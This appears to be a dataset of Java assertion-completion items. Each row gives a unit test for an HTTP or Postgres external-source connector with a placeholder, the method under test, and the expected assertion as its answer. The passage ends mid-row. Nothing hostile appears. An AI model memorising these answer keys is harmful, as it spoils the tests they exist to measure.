"shouldReturnHttpClient() { HttpAsyncConnector httpAsyncConnector = new HttpAsyncConnector(defaultHttpSourceConfig, externalMetricConfig, schemaConfig, httpClient, errorReporter, meterStatsManager, defaultDescriptorManager); AsyncHttpClient returnedHttpClient = httpAsyncConnector.getHttpClient(); ""<AssertPlaceHolder>""; }
getHttpClient() { return httpClient; }"	assertEquals(httpClient, returnedHttpClient)
"shouldPassInputIfFailOnErrorFalseAndStatusCodeIs404() { HttpResponseHandler httpResponseHandler = new HttpResponseHandler(httpSourceConfig, meterStatsManager, rowManager, columnNameManager, descriptor, resultFuture, errorReporter, new PostResponseTelemetry()); when(response.getStatusCode()).thenReturn(404);  httpResponseHandler.startTimer(); httpResponseHandler.onCompleted(response);  verify(resultFuture, times(1)).complete(Collections.singleton(streamData)); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.FAILURE_CODE_404); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.TOTAL_FAILED_REQUESTS); ArgumentCaptor<HttpFailureException> failureCaptor = ArgumentCaptor.forClass(HttpFailureException.class); verify(errorReporter, times(1)).reportNonFatalException(failureCaptor.capture()); ""<AssertPlaceHolder>""; verify(meterStatsManager, times(1)).updateHistogram(any(Aspects.class), any(Long.class)); }
onCompleted(Response response) { int statusCode = response.getStatusCode(); boolean isSuccess = Pattern.compile(SUCCESS_CODE_PATTERN).matcher(String.valueOf(statusCode)).matches(); if (isSuccess) { successHandler(response); } else { postResponseTelemetry.validateResponseCode(meterStatsManager, statusCode); failureHandler(""Received status code : "" + statusCode); } return response; }"	"assertEquals(""Received status code : 404"", failureCaptor.getValue().getMessage())"
"shouldPassInputIfFailOnErrorFalseAndStatusCodeIs4XXOtherThan404() { HttpResponseHandler httpResponseHandler = new HttpResponseHandler(httpSourceConfig, meterStatsManager, rowManager, columnNameManager, descriptor, resultFuture, errorReporter, new PostResponseTelemetry()); when(response.getStatusCode()).thenReturn(402);  httpResponseHandler.startTimer(); httpResponseHandler.onCompleted(response);  verify(resultFuture, times(1)).complete(Collections.singleton(streamData)); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.FAILURE_CODE_4XX); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.TOTAL_FAILED_REQUESTS); ArgumentCaptor<HttpFailureException> failureCaptor = ArgumentCaptor.forClass(HttpFailureException.class); verify(errorReporter, times(1)).reportNonFatalException(failureCaptor.capture()); ""<AssertPlaceHolder>""; verify(meterStatsManager, times(1)).updateHistogram(any(Aspects.class), any(Long.class)); }
onCompleted(Response response) { int statusCode = response.getStatusCode(); boolean isSuccess = Pattern.compile(SUCCESS_CODE_PATTERN).matcher(String.valueOf(statusCode)).matches(); if (isSuccess) { successHandler(response); } else { postResponseTelemetry.validateResponseCode(meterStatsManager, statusCode); failureHandler(""Received status code : "" + statusCode); } return response; }"	"assertEquals(""Received status code : 402"", failureCaptor.getValue().getMessage())"
"shouldPassInputIfFailOnErrorFalseAndStatusCodeIs5XX() { HttpResponseHandler httpResponseHandler = new HttpResponseHandler(httpSourceConfig, meterStatsManager, rowManager, columnNameManager, descriptor, resultFuture, errorReporter, new PostResponseTelemetry()); when(response.getStatusCode()).thenReturn(502);  httpResponseHandler.startTimer(); httpResponseHandler.onCompleted(response);  verify(resultFuture, times(1)).complete(Collections.singleton(streamData)); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.FAILURE_CODE_5XX); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.TOTAL_FAILED_REQUESTS);  ArgumentCaptor<HttpFailureException> failureCaptor = ArgumentCaptor.forClass(HttpFailureException.class); verify(errorReporter, times(1)).reportNonFatalException(failureCaptor.capture()); ""<AssertPlaceHolder>""; verify(meterStatsManager, times(1)).updateHistogram(any(Aspects.class), any(Long.class)); }
onCompleted(Response response) { int statusCode = response.getStatusCode(); boolean isSuccess = Pattern.compile(SUCCESS_CODE_PATTERN).matcher(String.valueOf(statusCode)).matches(); if (isSuccess) { successHandler(response); } else { postResponseTelemetry.validateResponseCode(meterStatsManager, statusCode); failureHandler(""Received status code : "" + statusCode); } return response; }"	"assertEquals(""Received status code : 502"", failureCaptor.getValue().getMessage())"
"shouldPassInputIfFailOnErrorFalseAndStatusCodeIsOtherThan5XXAnd4XX() { HttpResponseHandler httpResponseHandler = new HttpResponseHandler(httpSourceConfig, meterStatsManager, rowManager, columnNameManager, descriptor, resultFuture, errorReporter, new PostResponseTelemetry()); when(response.getStatusCode()).thenReturn(302);  httpResponseHandler.startTimer(); httpResponseHandler.onCompleted(response);  verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.OTHER_ERRORS); verify(resultFuture, times(1)).complete(Collections.singleton(streamData)); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.TOTAL_FAILED_REQUESTS); ArgumentCaptor<HttpFailureException> failureCaptor = ArgumentCaptor.forClass(HttpFailureException.class); verify(errorReporter, times(1)).reportNonFatalException(failureCaptor.capture()); ""<AssertPlaceHolder>""; verify(meterStatsManager, times(1)).updateHistogram(any(Aspects.class), any(Long.class)); }
onCompleted(Response response) { int statusCode = response.getStatusCode(); boolean isSuccess = Pattern.compile(SUCCESS_CODE_PATTERN).matcher(String.valueOf(statusCode)).matches(); if (isSuccess) { successHandler(response); } else { postResponseTelemetry.validateResponseCode(meterStatsManager, statusCode); failureHandler(""Received status code : "" + statusCode); } return response; }"	"assertEquals(""Received status code : 302"", failureCaptor.getValue().getMessage())"
"shouldThrowErrorIfFailOnErrorTrueAndStatusCodeIs404() { httpSourceConfig = new HttpSourceConfig(""http://localhost:8080/test"", """", ""POST"", ""{""key"": ""%s""}"", ""customer_id"", """", """", ""123"", ""234"", true, httpConfigType, ""345"", headers, outputMapping, ""metricId_02"", false); HttpResponseHandler httpResponseHandler = new HttpResponseHandler(httpSourceConfig, meterStatsManager, rowManager, columnNameManager, descriptor, resultFuture, errorReporter, new PostResponseTelemetry()); when(response.getStatusCode()).thenReturn(404);  httpResponseHandler.startTimer(); httpResponseHandler.onCompleted(response);  verify(resultFuture).completeExceptionally(any(HttpFailureException.class)); ArgumentCaptor<HttpFailureException> argumentCaptor = ArgumentCaptor.forClass(HttpFailureException.class); verify(errorReporter, times(1)) .reportFatalException(argumentCaptor.capture()); ""<AssertPlaceHolder>""; verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.FAILURE_CODE_404); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.TOTAL_FAILED_REQUESTS); verify(meterStatsManager, times(1)).updateHistogram(any(Aspects.class), any(Long.class)); }
onCompleted(Response response) { int statusCode = response.getStatusCode(); boolean isSuccess = Pattern.compile(SUCCESS_CODE_PATTERN).matcher(String.valueOf(statusCode)).matches(); if (isSuccess) { successHandler(response); } else { postResponseTelemetry.validateResponseCode(meterStatsManager, statusCode); failureHandler(""Received status code : "" + statusCode); } return response; }"	"assertEquals(""Received status code : 404"", argumentCaptor.getValue().getMessage())"
"shouldThrowErrorIfFailOnErrorTrueAndStatusCodeIs4XXOtherThan404() { httpSourceConfig = new HttpSourceConfig(""http://localhost:8080/test"", """", ""POST"", ""{""key"": ""%s""}"", ""customer_id"", """", """", ""123"", ""234"", true, httpConfigType, ""345"", headers, outputMapping, ""metricId_02"", false); HttpResponseHandler httpResponseHandler = new HttpResponseHandler(httpSourceConfig, meterStatsManager, rowManager, columnNameManager, descriptor, resultFuture, errorReporter, new PostResponseTelemetry()); when(response.getStatusCode()).thenReturn(400);  httpResponseHandler.startTimer(); httpResponseHandler.onCompleted(response);  ArgumentCaptor<HttpFailureException> failureCaptor = ArgumentCaptor.forClass(HttpFailureException.class); verify(resultFuture, times(1)).completeExceptionally(failureCaptor.capture()); ""<AssertPlaceHolder>""; verify(errorReporter, times(1)).reportFatalException(any(HttpFailureException.class)); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.FAILURE_CODE_4XX); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.TOTAL_FAILED_REQUESTS); verify(meterStatsManager, times(1)).updateHistogram(any(Aspects.class), any(Long.class)); }
onCompleted(Response response) { int statusCode = response.getStatusCode(); boolean isSuccess = Pattern.compile(SUCCESS_CODE_PATTERN).matcher(String.valueOf(statusCode)).matches(); if (isSuccess) { successHandler(response); } else { postResponseTelemetry.validateResponseCode(meterStatsManager, statusCode); failureHandler(""Received status code : "" + statusCode); } return response; }"	"assertEquals(""Received status code : 400"", failureCaptor.getValue().getMessage())"
"shouldThrowErrorIfFailOnErrorTrueAndStatusCodeIs5XX() { httpSourceConfig = new HttpSourceConfig(""http://localhost:8080/test"", """", ""POST"", ""{""key"": ""%s""}"", ""customer_id"", """", """", ""123"", ""234"", true, httpConfigType, ""345"", headers, outputMapping, ""metricId_02"", false); HttpResponseHandler httpResponseHandler = new HttpResponseHandler(httpSourceConfig, meterStatsManager, rowManager, columnNameManager, descriptor, resultFuture, errorReporter, new PostResponseTelemetry()); when(response.getStatusCode()).thenReturn(502);  httpResponseHandler.startTimer(); httpResponseHandler.onCompleted(response);  ArgumentCaptor<HttpFailureException> failureCaptor = ArgumentCaptor.forClass(HttpFailureException.class); verify(resultFuture, times(1)).completeExceptionally(failureCaptor.capture()); ""<AssertPlaceHolder>""; verify(errorReporter, times(1)).reportFatalException(any(HttpFailureException.class)); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.FAILURE_CODE_5XX); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.TOTAL_FAILED_REQUESTS); verify(meterStatsManager, times(1)).updateHistogram(any(Aspects.class), any(Long.class)); }
onCompleted(Response response) { int statusCode = response.getStatusCode(); boolean isSuccess = Pattern.compile(SUCCESS_CODE_PATTERN).matcher(String.valueOf(statusCode)).matches(); if (isSuccess) { successHandler(response); } else { postResponseTelemetry.validateResponseCode(meterStatsManager, statusCode); failureHandler(""Received status code : "" + statusCode); } return response; }"	"assertEquals(""Received status code : 502"", failureCaptor.getValue().getMessage())"
"shouldThrowErrorIfFailOnErrorTrueAndStatusCodeIsOtherThan5XXAnd4XX() { httpSourceConfig = new HttpSourceConfig(""http://localhost:8080/test"", """", ""POST"", ""{""key"": ""%s""}"", ""customer_id"", """", """", ""123"", ""234"", true, httpConfigType, ""345"", headers, outputMapping, ""metricId_02"", false); HttpResponseHandler httpResponseHandler = new HttpResponseHandler(httpSourceConfig, meterStatsManager, rowManager, columnNameManager, descriptor, resultFuture, errorReporter, new PostResponseTelemetry()); when(response.getStatusCode()).thenReturn(302);  httpResponseHandler.startTimer(); httpResponseHandler.onCompleted(response);  ArgumentCaptor<HttpFailureException> failureCaptor = ArgumentCaptor.forClass(HttpFailureException.class); verify(resultFuture, times(1)).completeExceptionally(failureCaptor.capture()); ""<AssertPlaceHolder>""; verify(errorReporter, times(1)).reportFatalException(any(HttpFailureException.class)); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.OTHER_ERRORS); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.TOTAL_FAILED_REQUESTS); verify(meterStatsManager, times(1)).updateHistogram(any(Aspects.class), any(Long.class)); }
onCompleted(Response response) { int statusCode = response.getStatusCode(); boolean isSuccess = Pattern.compile(SUCCESS_CODE_PATTERN).matcher(String.valueOf(statusCode)).matches(); if (isSuccess) { successHandler(response); } else { postResponseTelemetry.validateResponseCode(meterStatsManager, statusCode); failureHandler(""Received status code : "" + statusCode); } return response; }"	"assertEquals(""Received status code : 302"", failureCaptor.getValue().getMessage())"
"shouldPassInputIfFailOnErrorFalseAndOnThrowable() { HttpResponseHandler httpResponseHandler = new HttpResponseHandler(httpSourceConfig, meterStatsManager, rowManager, columnNameManager, descriptor, resultFuture, errorReporter, new PostResponseTelemetry()); Throwable throwable = new Throwable(""throwable message"");  httpResponseHandler.startTimer(); httpResponseHandler.onThrowable(throwable);  verify(resultFuture, times(1)).complete(Collections.singleton(streamData)); ArgumentCaptor<HttpFailureException> failureCaptor = ArgumentCaptor.forClass(HttpFailureException.class); verify(errorReporter, times(1)).reportNonFatalException(failureCaptor.capture()); ""<AssertPlaceHolder>""; verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.TOTAL_FAILED_REQUESTS); verify(meterStatsManager, times(1)).updateHistogram(any(Aspects.class), any(Long.class)); }
onThrowable(Throwable t) { meterStatsManager.markEvent(ExternalSourceAspects.OTHER_ERRORS); failureHandler(t.getMessage()); }"	"assertEquals(""throwable message"", failureCaptor.getValue().getMessage())"
"shouldThrowErrorIfFailOnErrorTrueAndOnThrowable() { httpSourceConfig = new HttpSourceConfig(""http://localhost:8080/test"", """", ""POST"", ""{""key"": ""%s""}"", ""customer_id"", """", """", ""123"", ""234"", true, httpConfigType, ""345"", headers, outputMapping, ""metricId_02"", false); HttpResponseHandler httpResponseHandler = new HttpResponseHandler(httpSourceConfig, meterStatsManager, rowManager, columnNameManager, descriptor, resultFuture, errorReporter, new PostResponseTelemetry()); Throwable throwable = new Throwable(""throwable message"");  httpResponseHandler.startTimer(); httpResponseHandler.onThrowable(throwable);  verify(resultFuture).completeExceptionally(any(RuntimeException.class)); ArgumentCaptor<HttpFailureException> failureCaptor = ArgumentCaptor.forClass(HttpFailureException.class); verify(errorReporter, times(1)).reportFatalException(failureCaptor.capture()); ""<AssertPlaceHolder>""; verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.OTHER_ERRORS); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.TOTAL_FAILED_REQUESTS); verify(meterStatsManager, times(1)).updateHistogram(any(Aspects.class), any(Long.class)); }
onThrowable(Throwable t) { meterStatsManager.markEvent(ExternalSourceAspects.OTHER_ERRORS); failureHandler(t.getMessage()); }"	"assertEquals(""throwable message"", failureCaptor.getValue().getMessage())"
"shouldReturnConnectTimeout() { ""<AssertPlaceHolder>""; }
getConnectTimeout() { return Integer.parseInt(connectTimeout); }"	assertEquals(parseInt(connectTimeout), (int) defaultHttpSourceConfig.getConnectTimeout())
"shouldReturnEndpoint() { ""<AssertPlaceHolder>""; }
getEndpoint() { return endpoint; }"	assertEquals(endpoint, defaultHttpSourceConfig.getEndpoint())
"shouldReturnStreamTimeout() { ""<AssertPlaceHolder>""; }
getStreamTimeout() { return Integer.valueOf(streamTimeout); }"	assertEquals(Integer.valueOf(streamTimeout), defaultHttpSourceConfig.getStreamTimeout())
"shouldReturnBodyPattern() { ""<AssertPlaceHolder>""; }
getPattern() { return requestPattern; }"	assertEquals(requestPattern, defaultHttpSourceConfig.getPattern())
"shouldReturnBodyVariable() { ""<AssertPlaceHolder>""; }
getRequestVariables() { return requestVariables; }"	assertEquals(requestVariables, defaultHttpSourceConfig.getRequestVariables())
"isRetainResponseTypeShouldGetTheRightConfig() { ""<AssertPlaceHolder>""; }
isRetainResponseType() { return retainResponseType; }"	assertEquals(retainResponseType, defaultHttpSourceConfig.isRetainResponseType())
"shouldReturnFailOnErrors() { ""<AssertPlaceHolder>""; }
isFailOnErrors() { return failOnErrors; }"	assertEquals(failOnErrors, defaultHttpSourceConfig.isFailOnErrors())
"shouldReturnVerb() { ""<AssertPlaceHolder>""; }
getVerb() { return verb; }"	assertEquals(verb, defaultHttpSourceConfig.getVerb())
"getMetricIdShouldGetRightConfig() { ""<AssertPlaceHolder>""; }
getMetricId() { return metricId; }"	assertEquals(metricId, defaultHttpSourceConfig.getMetricId())
"shouldReturnType() { ""<AssertPlaceHolder>""; }
getType() { return type; }"	assertEquals(type, defaultHttpSourceConfig.getType())
"hasTypeShouldBeTrueWhenTypeIsPresent() { ""<AssertPlaceHolder>""; }
hasType() { return StringUtils.isNotEmpty(type); }"	assertTrue(defaultHttpSourceConfig.hasType())
"hasTypeShouldBeFalseWhenTypeIsNull() { HttpSourceConfig httpSourceConfig = new HttpSourceConfig("""", """", """", """", """", """", """", null, """", false, null, """", new HashMap<>(), new HashMap<>(), metricId, false); ""<AssertPlaceHolder>""; }
hasType() { return StringUtils.isNotEmpty(type); }"	assertFalse(httpSourceConfig.hasType())
"hasTypeShouldBeFalseWhenTypeIsEmpty() { HttpSourceConfig httpSourceConfig = new HttpSourceConfig("""", """", """", """", """", """", """", """", """", false, """", """", new HashMap<>(), new HashMap<>(), metricId, false); ""<AssertPlaceHolder>""; }
hasType() { return StringUtils.isNotEmpty(type); }"	assertFalse(httpSourceConfig.hasType())
"shouldReturnHeaderMap() { ""<AssertPlaceHolder>""; }
getHeaders() { return headers; }"	assertEquals(headerMap, defaultHttpSourceConfig.getHeaders())
"shouldReturnOutputMapping() { ""<AssertPlaceHolder>""; }
getOutputMapping() { return outputMapping; }"	assertEquals(outputMappings, defaultHttpSourceConfig.getOutputMapping())
"shouldReturnCapacity() { ""<AssertPlaceHolder>""; }
getCapacity() { return Integer.parseInt(capacity); }"	assertEquals(Integer.valueOf(capacity), defaultHttpSourceConfig.getCapacity())
"shouldReturnColumnNames() { List<String> actualColumns = defaultHttpSourceConfig.getOutputColumns(); String[] expectedColumns = {""surge_factor""}; ""<AssertPlaceHolder>""; }
getOutputColumns() { return new ArrayList<>(outputMapping.keySet()); }"	assertArrayEquals(expectedColumns, actualColumns.toArray())
"canDecorateHttpAsync() { HttpStreamDecorator httpStreamDecorator = new HttpStreamDecorator(httpSourceConfig, externalMetricConfig, schemaConfig); ""<AssertPlaceHolder>""; }
canDecorate() { return httpSourceConfig != null; }"	assertTrue(httpStreamDecorator.canDecorate())
"shouldNotDecorateOtherThanHttpAsync() { HttpStreamDecorator httpStreamDecorator = new HttpStreamDecorator(null, externalMetricConfig, schemaConfig); ""<AssertPlaceHolder>""; }
canDecorate() { return httpSourceConfig != null; }"	assertFalse(httpStreamDecorator.canDecorate())
"shouldReturnTrueForGetVerbOnCanCreate() { httpSourceConfig = new HttpSourceConfig(""http://localhost:8080/test"", """", ""GET"", ""{""key"": ""%s""}"", ""1"", """", """", ""123"", ""234"", false, ""type"", ""345"", new HashMap<>(), null, ""metricId_01"", false); HttpGetRequestHandler httpGetRequestBuilder = new HttpGetRequestHandler(httpSourceConfig, httpClient, requestVariablesValues.toArray(), headerVariablesValues.toArray(), endpointVariablesValues.toArray()); ""<AssertPlaceHolder>""; }
canCreate() { return httpSourceConfig.getVerb().equalsIgnoreCase(""get""); }"	assertTrue(httpGetRequestBuilder.canCreate())
"shouldReturnFalseForVerbOtherThanGetOnCanBuild() { httpSourceConfig = new HttpSourceConfig(""http://localhost:8080/test"", """", ""POST"", ""{""key"": ""%s""}"", ""1"", """", """", ""123"", ""234"", false, ""type"", ""345"", new HashMap<>(), null, ""metricId_01"", false); HttpGetRequestHandler httpGetRequestBuilder = new HttpGetRequestHandler(httpSourceConfig, httpClient, requestVariablesValues.toArray(), headerVariablesValues.toArray(), endpointVariablesValues.toArray()); ""<AssertPlaceHolder>""; }
canCreate() { return httpSourceConfig.getVerb().equalsIgnoreCase(""get""); }"	assertFalse(httpGetRequestBuilder.canCreate())
"shouldBuildGetRequest() { when(httpClient.prepareGet(""http://localhost:8080/test/key/1"")).thenReturn(request); httpSourceConfig = new HttpSourceConfig(""http://localhost:8080/test"", """", ""GET"", ""/key/%s"", ""1"", """", """", ""123"", ""234"", false, ""type"", ""345"", new HashMap<>(), null, ""metricId_01"", false); HttpGetRequestHandler httpGetRequestBuilder = new HttpGetRequestHandler(httpSourceConfig, httpClient, requestVariablesValues.toArray(), headerVariablesValues.toArray(), endpointVariablesValues.toArray()); ""<AssertPlaceHolder>""; }
create() { String endpointPath = String.format(httpSourceConfig.getPattern(), requestVariablesValues); String endpoint = String.format(httpSourceConfig.getEndpoint(), endpointVariablesValues);  String requestEndpoint = endpoint + endpointPath; BoundRequestBuilder getRequest = httpClient.prepareGet(requestEndpoint); Map<String, String> headers = httpSourceConfig.getHeaders(); if (!StringUtil.isNullOrEmpty(httpSourceConfig.getHeaderPattern())) { try { String dynamicHeader = String.format(httpSourceConfig.getHeaderPattern(), dynamicHeaderVariablesValues); headers.putAll(new Gson().fromJson(dynamicHeader, HashMap.class)); } catch (UnknownFormatConversionException e) { throw new InvalidConfigurationException(String.format(""pattern config '%s' is invalid"", httpSourceConfig.getHeaderPattern())); } catch (IllegalArgumentException e) { throw new InvalidConfigurationException(String.format(""pattern config '%s' is incompatible with the variable config '%s'"", httpSourceConfig.getHeaderPattern(), httpSourceConfig.getHeaderVariables())); } } return addHeaders(getRequest, headers); }"	assertEquals(request, httpGetRequestBuilder.create())
"shouldReturnTrueForPostVerbOnCanCreate() { httpSourceConfig = new HttpSourceConfig(""http://localhost:8080/test"", null, ""POST"", ""{""key"": ""%s""}"", ""1"", """", """", ""123"", ""234"", false, ""type"", ""345"", new HashMap<>(), null, ""metricId_01"", false); HttpPostRequestHandler httpPostRequestBuilder = new HttpPostRequestHandler(httpSourceConfig, httpClient, requestVariablesValues.toArray(), dynamicHeaderVariablesValues.toArray(), endpointVariablesValues.toArray()); ""<AssertPlaceHolder>""; }
canCreate() { return httpSourceConfig.getVerb().equalsIgnoreCase(""post""); }"	assertTrue(httpPostRequestBuilder.canCreate())
"shouldReturnFalseForVerbOtherThanPostOnCanBuild() { httpSourceConfig = new HttpSourceConfig(""http://localhost:8080/test"", """", ""GET"", ""{""key"": ""%s""}"", ""1"", """", """", ""123"", ""234"", false, ""type"", ""345"", new HashMap<>(), null, ""metricId_01"", false); HttpPostRequestHandler httpPostRequestBuilder = new HttpPostRequestHandler(httpSourceConfig, httpClient, requestVariablesValues.toArray(), dynamicHeaderVariablesValues.toArray(), endpointVariablesValues.toArray()); ""<AssertPlaceHolder>""; }
canCreate() { return httpSourceConfig.getVerb().equalsIgnoreCase(""post""); }"	assertFalse(httpPostRequestBuilder.canCreate())
"shouldBuildPostRequestWithoutHeader() { when(httpClient.preparePost(""http://localhost:8080/test"")).thenReturn(request); when(request.setBody(""{""key"": ""1""}"")).thenReturn(request); httpSourceConfig = new HttpSourceConfig(""http://localhost:8080/test"", """", ""POST"", ""{""key"": ""%s""}"", ""1"", """", """", ""123"", ""234"", false, ""type"", ""345"", new HashMap<>(), null, ""metricId_01"", false); HttpPostRequestHandler httpPostRequestBuilder = new HttpPostRequestHandler(httpSourceConfig, httpClient, requestVariablesValues.toArray(), dynamicHeaderVariablesValues.toArray(), endpointVariablesValues.toArray()); ""<AssertPlaceHolder>""; }
create() { String requestBody = String.format(httpSourceConfig.getPattern(), requestVariablesValues); String endpoint = String.format(httpSourceConfig.getEndpoint(), endpointVariablesValues);  BoundRequestBuilder postRequest = httpClient .preparePost(endpoint) .setBody(requestBody); Map<String, String> headers = httpSourceConfig.getHeaders(); if (!StringUtil.isNullOrEmpty(httpSourceConfig.getHeaderPattern())) { try { String dynamicHeader = String.format(httpSourceConfig.getHeaderPattern(), dynamicHeaderVariablesValues); headers.putAll(new Gson().fromJson(dynamicHeader, HashMap.class)); } catch (UnknownFormatConversionException e) { throw new InvalidConfigurationException(String.format(""pattern config '%s' is invalid"", httpSourceConfig.getHeaderPattern())); } catch (IllegalArgumentException e) { throw new InvalidConfigurationException(String.format(""pattern config '%s' is incompatible with the variable config '%s'"", httpSourceConfig.getHeaderPattern(), httpSourceConfig.getHeaderVariables())); } } return addHeaders(postRequest, headers); }"	assertEquals(request, httpPostRequestBuilder.create())
"shouldClosePgClientAndSetItToNullMarkingCloseConnectionEvent() { PgAsyncConnector pgAsyncConnector = new PgAsyncConnector(pgSourceConfig, externalMetricConfig, schemaConfig, meterStatsManager, pgClient, errorReporter); pgAsyncConnector.close();  verify(pgClient, times(1)).close(); ""<AssertPlaceHolder>""; verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.CLOSE_CONNECTION_ON_EXTERNAL_CLIENT); }
getPgClient() { return pgClient; }"	assertNull(pgAsyncConnector.getPgClient())
"shouldReportNonFatalExceptionAndCompleteWhenEventComesToFailureHandleAndFailOnErrorsIsFalse() { PgResponseHandler pgResponseHandler = new PgResponseHandler(pgSourceConfig, meterStatsManager, rowManager, columnNameManager, descriptor, resultFuture, errorReporter, new PostResponseTelemetry()); when(event.succeeded()).thenReturn(false); when(event.cause()).thenReturn(new Exception(""failure message!""));  pgResponseHandler.startTimer(); pgResponseHandler.handle(event);  ArgumentCaptor<HttpFailureException> nonFatalExcepCaptor = ArgumentCaptor.forClass(HttpFailureException.class); verify(errorReporter, times(1)).reportNonFatalException(nonFatalExcepCaptor.capture()); ""<AssertPlaceHolder>""; verify(resultFuture, times(1)).complete(Collections.singleton(streamData)); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.TOTAL_FAILED_REQUESTS); verify(meterStatsManager, times(1)).updateHistogram(any(Aspects.class), any(Long.class)); }
handle(AsyncResult<RowSet<io.vertx.sqlclient.Row>> event) { if (event.succeeded()) { successHandler(event.result()); } else { failureHandler(event.cause()); } }"	"assertEquals(""PgResponseHandler : Failed with error. failure message!"", nonFatalExcepCaptor.getValue().getMessage())"
"getHostShouldGetRightConfig() { ""<AssertPlaceHolder>""; }
getHost() { return host; }"	assertEquals(host, pgSourceConfig.getHost())
"getPortShouldGetRightConfig() { ""<AssertPlaceHolder>""; }
getPort() { return Integer.valueOf(port); }"	assertEquals(Integer.valueOf(port), pgSourceConfig.getPort())
"getUserShouldGetRightConfig() { ""<AssertPlaceHolder>""; }
getUser() { return user; }"	assertEquals(user, pgSourceConfig.getUser())
"getPasswordShouldGetRightConfig() { ""<AssertPlaceHolder>""; }
getPassword() { return password; }"	assertEquals(password, pgSourceConfig.getPassword())
"getDatabaseShouldGetRightConfig() { ""<AssertPlaceHolder>""; }
getDatabase() { return database; }"	assertEquals(database, pgSourceConfig.getDatabase())
"getQueryPatternShouldGetRightConfig() { ""<AssertPlaceHolder>""; }
getPattern() { return queryPattern; }"	assertEquals(queryPattern, pgSourceConfig.getPattern())
"getQueryVariablesShouldGetRightConfig() { ""<AssertPlaceHolder>""; }
getQueryVariables() { return queryVariables; }"	assertEquals(queryVariables, pgSourceConfig.getQueryVariables())
"getTypeShouldGetRightConfig() { ""<AssertPlaceHolder>""; }
getType() { return type; }"	assertEquals(type, pgSourceConfig.getType())
"hasTypeShouldBeTrueWhenTypeIsPresent() { ""<AssertPlaceHolder>""; }
hasType() { return StringUtils.isNotEmpty(type); }"	assertTrue(pgSourceConfig.hasType())
"hasTypeShouldBeFalseWhenTypeIsNull() { pgSourceConfig = getPgSourceConfigBuilder() .setType(null) .createPgSourceConfig(); ""<AssertPlaceHolder>""; }
hasType() { return StringUtils.isNotEmpty(type); }"	assertFalse(pgSourceConfig.hasType())
"hasTypeShouldBeFalseWhenTypeIsEmpty() { pgSourceConfig = getPgSourceConfigBuilder() .setType("""") .createPgSourceConfig(); ""<AssertPlaceHolder>""; }
hasType() { return StringUtils.isNotEmpty(type); }"	assertFalse(pgSourceConfig.hasType())
"getCapacityShouldGetRightConfig() { ""<AssertPlaceHolder>""; }
getCapacity() { return Integer.valueOf(capacity); }"	assertEquals(Integer.valueOf(capacity), pgSourceConfig.getCapacity())
"getIdleTimeoutShouldGetRightConfig() { ""<AssertPlaceHolder>""; }
getIdleTimeout() { return Integer.valueOf(idleTimeout); }"	assertEquals(Integer.valueOf(idleTimeout), pgSourceConfig.getIdleTimeout())
"getStreamTimeoutShouldGetRightConfig() { ""<AssertPlaceHolder>""; }
getStreamTimeout() { return Integer.valueOf(streamTimeout); }"	assertEquals(Integer.valueOf(streamTimeout), pgSourceConfig.getStreamTimeout())
"getConnectTimeoutShouldGetRightConfig() { ""<AssertPlaceHolder>""; }
getConnectTimeout() { return Integer.valueOf(connectTimeout); }"	assertEquals(Integer.valueOf(connectTimeout), pgSourceConfig.getConnectTimeout())
"isRetainResponseTypeShouldGetTheRightConfig() { ""<AssertPlaceHolder>""; }
isRetainResponseType() { return retainResponseType; }"	assertEquals(retainResponseType, pgSourceConfig.isRetainResponseType())
"getOutputColumnNames() { List<String> keys = new ArrayList<>(); keys.add(""outputField""); defaultOutputMapping.put(""outputField"", ""param""); ""<AssertPlaceHolder>""; }
getOutputColumns() { return new ArrayList<>(outputMapping.keySet()); }"	assertEquals(keys, pgSourceConfig.getOutputColumns())
"shouldReturnMandatoryFields() { HashMap<String, Object> expectedMandatoryFields = new HashMap<>(); expectedMandatoryFields.put(""host"", host); expectedMandatoryFields.put(""port"", port); expectedMandatoryFields.put(""user"", user); expectedMandatoryFields.put(""password"", password); expectedMandatoryFields.put(""database"", database); expectedMandatoryFields.put(""capacity"", capacity); expectedMandatoryFields.put(""stream_timeout"", streamTimeout); expectedMandatoryFields.put(""connect_timeout"", connectTimeout); expectedMandatoryFields.put(""idle_timeout"", idleTimeout); expectedMandatoryFields.put(""query_pattern"", queryPattern); expectedMandatoryFields.put(""output_mapping"", defaultOutputMapping); expectedMandatoryFields.put(""fail_on_errors"", failOnErrors); HashMap<String, Object> actualMandatoryFields = pgSourceConfig.getMandatoryFields(); ""<AssertPlaceHolder>""; }
getMandatoryFields() { HashMap<String, Object> mandatoryFields = new HashMap<>(); mandatoryFields.put(""host"", host); mandatoryFields.put(""port"", port); mandatoryFields.put(""user"", user); mandatoryFields.put(""password"", password); mandatoryFields.put(""database"", database); mandatoryFields.put(""capacity"", capacity); mandatoryFields.put(""stream_timeout"", streamTimeout); mandatoryFields.put(""connect_timeout"", connectTimeout); mandatoryFields.put(""idle_timeout"", idleTimeout); mandatoryFields.put(""query_pattern"", queryPattern); mandatoryFields.put(""output_mapping"", outputMapping); mandatoryFields.put(""fail_on_errors"", failOnErrors);  return mandatoryFields; }"	assertArrayEquals(expectedMandatoryFields.values().toArray(), actualMandatoryFields.values().toArray())
"canDecorateStreamWhenConfigIsPresent() { PgStreamDecorator pgStreamDecorator = new PgStreamDecorator(pgSourceConfig, externalMetricConfig, schemaConfig);  ""<AssertPlaceHolder>""; }
